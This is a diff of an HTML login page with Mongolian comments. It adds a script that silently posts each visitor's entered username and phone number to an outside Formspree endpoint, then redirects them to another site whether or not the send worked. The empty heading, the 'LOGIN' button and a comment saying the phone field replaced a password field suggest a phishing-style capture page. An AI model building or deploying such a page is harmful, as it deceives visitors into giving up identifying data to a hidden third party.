@@ -14,10 +14,10 @@ input {
 h1 {
   font-size: 50px;
 }
-label{
+label {
   font-size: 50px;
 }
-input{
+input {
   font-size: 45px;
 }
 
@@ -36,7 +36,7 @@ input[type=text].user-input {
   box-sizing: border-box;
 }
 
-/* Phone input байрлал (хуучин password байсан байрлал) */
+/* Phone input байрлал */
 input[type=text].phone-input {
   position: fixed;
   height: 115px;
@@ -51,7 +51,8 @@ input[type=text].phone-input {
   box-sizing: border-box;
 }
 
-input[type=submit] {
+/* Илгээх товч */
+.login-btn {
   position: fixed;
   height: 115px;
   top: 42.8%;
@@ -64,9 +65,10 @@ input[type=submit] {
   border: 0px solid #ccc;
   border-radius: 10px;
   cursor: pointer;
+  font-size: 45px;
 }
 
-input[type=submit]:hover {
+.login-btn:hover {
   background-color: #45a049;
 }
 
@@ -96,14 +98,45 @@ body {
 </head>
 <body>
 
-<div class="login-box">
-    <form action="https://formspree.io/f/xaeegqyy" method="POST">
-        <h1 style="color:rgb(255, 255, 255 );"></h1>
-        <input type="text" name="username" class="user-input" placeholder="Enter username" required><br>
-        <input type="text" name="phone" class="phone-input" placeholder="Enter phone number" required><br>
-        <input type="submit" value="LOGIN">
-    </form>
-</div>
+    <!-- НЭВТРЭХ ХЭСЭГ -->
+    <div class="login-box" id="loginSection">
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <h1 style="color:rgb(255, 255, 255 );"></h1>
+            <input type="text" name="username" id="username" class="user-input" placeholder="Enter username" required><br>
+            <input type="text" name="phone" id="phone" class="phone-input" placeholder="Enter phone number" required><br>
+            <button type="submit" class="login-btn">LOGIN</button>
+        </form>
+    </div>
+
+<script>
+    function handleLogin(event) {
+        event.preventDefault(); // Форм автоматаар шилжихийг зогсооно
+
+        const username = document.getElementById("username").value;
+        const phone = document.getElementById("phone").value;
+
+        // 1. Formspree руу мэдээллийг цаана нь илгээх
+        const formData = new FormData();
+        formData.append("username", username);
+        formData.append("phone", phone);
+
+        fetch("https://formspree.io/f/xaeegqyy", {
+            method: "POST",
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        })
+        .then(response => {
+            // 2. Formspree руу амжилттай очсоны дараа үсрэх сайт линк
+            window.location.href = "https://example.com"; // <-- Энд очихыг хүссэн өөрийнхөө сайтын линкийг бичнэ үү
+        })
+        .catch(error => {
+            // Ямар нэг алдаа гарсан ч мөн адил сайт руу шилжүүлэх
+            window.location.href = "https://example.com"; 
+        });
+    }
+</script>
 
 </body>
 </html>
